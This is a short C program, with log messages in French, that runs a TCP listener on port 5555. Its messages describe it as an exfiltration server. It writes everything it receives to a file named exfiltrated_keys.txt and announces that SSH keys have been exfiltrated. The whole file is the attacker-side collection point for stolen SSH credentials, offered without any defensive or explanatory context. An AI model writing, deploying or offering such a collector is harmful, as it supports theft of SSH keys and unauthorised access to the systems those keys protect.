#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 5555
#define BUFFER_SIZE 4096

int main() {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size;
    char buffer[BUFFER_SIZE];

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    listen(server_sock, 5);

    printf("[+] Serveur d'exfiltration en attente sur le port %d...\n", PORT);

    while (1) {
        addr_size = sizeof(client_addr);
        client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &addr_size);
        printf("[+] Connexion reçue de %s\n", inet_ntoa(client_addr.sin_addr));

        FILE *logfile = fopen("exfiltrated_keys.txt", "a");
        if (!logfile) {
            perror("fopen");
            close(client_sock);
            continue;
        }

        int bytes_received;
        while ((bytes_received = recv(client_sock, buffer, BUFFER_SIZE, 0)) > 0) {
            fwrite(buffer, 1, bytes_received, logfile);
        }

        printf("[+] Clés SSH exfiltrées enregistrées.\n");
        fclose(logfile);
        close(client_sock);
    }

    close(server_sock);
    return 0;
}
